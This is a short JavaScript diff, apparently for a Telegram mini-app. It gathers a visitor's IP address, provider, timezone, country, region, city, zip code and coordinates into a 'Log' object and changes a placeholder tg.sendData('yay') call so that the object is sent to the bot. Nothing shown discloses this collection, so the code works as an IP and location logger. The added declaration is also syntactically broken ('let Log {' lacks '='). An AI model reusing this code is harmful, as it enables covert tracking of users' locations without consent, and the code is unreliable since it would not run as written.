@@ -33,6 +33,19 @@ const request = async () => { // Calling a "synchronous" fetch
     var lat = data.latitude;
     var lon = data.longitude;
 
+    let Log {
+        ip: ip,
+	provider: provider,
+	timezone: timezone,
+	country: country,
+	country_code: countryCode,
+	region: region,
+	city: city,
+	zip: zip,
+	ip_latitude: lat,
+	ip_longitude: lon
+    };
+
     console.log(ip);
     console.log(provider);
     console.log(timezone);
@@ -44,7 +57,7 @@ const request = async () => { // Calling a "synchronous" fetch
     console.log(`IP Latitude: ` + lat);
     console.log(`IP Longitude: ` + lon);
 
-    tg.sendData("yay");
+    tg.sendData(JSON.stringify(Log));
 }
 
 request();
